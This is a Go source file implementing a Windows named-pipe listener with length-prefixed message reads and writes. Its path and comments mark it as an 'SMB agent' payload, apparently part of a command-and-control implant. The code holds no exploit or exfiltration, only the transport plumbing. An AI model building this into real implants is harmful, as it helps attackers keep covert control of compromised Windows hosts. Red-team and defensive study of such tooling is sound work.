// server/docker/payloads/SMB_Windows/pipe_listener.go
// Named pipe listener for SMB agent

//go:build windows
// +build windows

package main

import (
	"fmt"
	"sync"

	"golang.org/x/sys/windows"
)

const (
	// Pipe configuration
	pipeBufferSize = 65536
	maxInstances   = 10
)

// PipeListener manages a named pipe server
type PipeListener struct {
	pipePath string
	handle   windows.Handle
	mu       sync.Mutex
	closed   bool
}

// PipeConnection represents a client connection to the pipe
type PipeConnection struct {
	handle windows.Handle
	closed bool
	mu     sync.Mutex
}

// NewPipeListener creates a new named pipe listener
func NewPipeListener(pipeName string) (*PipeListener, error) {
	// Build full pipe path
	pipePath := fmt.Sprintf(`\\.\pipe\%s`, pipeName)

	// Convert to UTF16
	pipePathPtr, err := windows.UTF16PtrFromString(pipePath)
	if err != nil {
		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Create the named pipe
	handle, err := windows.CreateNamedPipe(
		pipePathPtr,
		windows.PIPE_ACCESS_DUPLEX|windows.FILE_FLAG_OVERLAPPED,
		windows.PIPE_TYPE_MESSAGE|windows.PIPE_READMODE_MESSAGE|windows.PIPE_WAIT,
		maxInstances,
		pipeBufferSize,
		pipeBufferSize,
		0,
		nil, // Default security attributes
	)
	if err != nil {
		return nil, fmt.Errorf(ErrCtx(E37, err.Error()))
	}

	return &PipeListener{
		pipePath: pipePath,
		handle:   handle,
	}, nil
}

// Accept waits for and accepts a new pipe connection
func (pl *PipeListener) Accept() (*PipeConnection, error) {
	pl.mu.Lock()
	if pl.closed {
		pl.mu.Unlock()
		return nil, fmt.Errorf(Err(E4))
	}
	handle := pl.handle
	pl.mu.Unlock()

	// Create overlapped structure for async operation
	overlapped := &windows.Overlapped{}
	event, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return nil, fmt.Errorf(ErrCtx(E37, err.Error()))
	}
	defer windows.CloseHandle(event)
	overlapped.HEvent = event

	// Wait for a client to connect
	err = windows.ConnectNamedPipe(handle, overlapped)
	if err == windows.ERROR_IO_PENDING {
		// Wait for connection
		windows.WaitForSingleObject(event, windows.INFINITE)
	} else if err != nil && err != windows.ERROR_PIPE_CONNECTED {
		return nil, fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Create connection wrapper
	conn := &PipeConnection{
		handle: handle,
	}

	// Create a new pipe instance for the next connection
	pl.mu.Lock()
	if !pl.closed {
		pipePathPtr, _ := windows.UTF16PtrFromString(pl.pipePath)
		newHandle, err := windows.CreateNamedPipe(
			pipePathPtr,
			windows.PIPE_ACCESS_DUPLEX|windows.FILE_FLAG_OVERLAPPED,
			windows.PIPE_TYPE_MESSAGE|windows.PIPE_READMODE_MESSAGE|windows.PIPE_WAIT,
			maxInstances,
			pipeBufferSize,
			pipeBufferSize,
			0,
			nil,
		)
		if err == nil {
			pl.handle = newHandle
		}
	}
	pl.mu.Unlock()

	return conn, nil
}

// GetPipePath returns the full pipe path
func (pl *PipeListener) GetPipePath() string {
	return pl.pipePath
}

// Close closes the pipe listener
func (pl *PipeListener) Close() error {
	pl.mu.Lock()
	defer pl.mu.Unlock()

	if pl.closed {
		return nil
	}

	pl.closed = true
	return windows.CloseHandle(pl.handle)
}

// ReadMessage reads a length-prefixed message from the pipe
func (pc *PipeConnection) ReadMessage() ([]byte, error) {
	pc.mu.Lock()
	defer pc.mu.Unlock()

	if pc.closed {
		return nil, fmt.Errorf(Err(E4))
	}

	// Read 4-byte length header
	header := make([]byte, 4)
	if err := pc.readFull(header); err != nil {
		return nil, fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24

	// Sanity check
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf(Err(E2))
	}

	// Read message body
	data := make([]byte, length)
	if err := pc.readFull(data); err != nil {
		return nil, fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	return data, nil
}

// WriteMessage writes a length-prefixed message to the pipe
func (pc *PipeConnection) WriteMessage(data []byte) error {
	pc.mu.Lock()
	defer pc.mu.Unlock()

	if pc.closed {
		return fmt.Errorf(Err(E4))
	}

	// Create length header
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}

	// Write header
	if err := pc.writeFull(header); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Write data
	if err := pc.writeFull(data); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	return nil
}

// Close closes the pipe connection
func (pc *PipeConnection) Close() error {
	pc.mu.Lock()
	defer pc.mu.Unlock()

	if pc.closed {
		return nil
	}

	pc.closed = true

	// Disconnect the client
	windows.DisconnectNamedPipe(pc.handle)

	return nil
}

// readFull reads exactly len(buf) bytes
func (pc *PipeConnection) readFull(buf []byte) error {
	overlapped := &windows.Overlapped{}
	event, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(event)
	overlapped.HEvent = event

	totalRead := 0
	for totalRead < len(buf) {
		var bytesRead uint32
		err := windows.ReadFile(pc.handle, buf[totalRead:], &bytesRead, overlapped)
		if err == windows.ERROR_IO_PENDING {
			windows.WaitForSingleObject(event, windows.INFINITE)
			err = windows.GetOverlappedResult(pc.handle, overlapped, &bytesRead, false)
		}
		if err != nil && err != windows.ERROR_MORE_DATA {
			return err
		}
		totalRead += int(bytesRead)
	}

	return nil
}

// writeFull writes all bytes
func (pc *PipeConnection) writeFull(buf []byte) error {
	overlapped := &windows.Overlapped{}
	event, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(event)
	overlapped.HEvent = event

	totalWritten := 0
	for totalWritten < len(buf) {
		var bytesWritten uint32
		err := windows.WriteFile(pc.handle, buf[totalWritten:], &bytesWritten, overlapped)
		if err == windows.ERROR_IO_PENDING {
			windows.WaitForSingleObject(event, windows.INFINITE)
			err = windows.GetOverlappedResult(pc.handle, overlapped, &bytesWritten, false)
		}
		if err != nil {
			return err
		}
		totalWritten += int(bytesWritten)
	}

	return nil
}
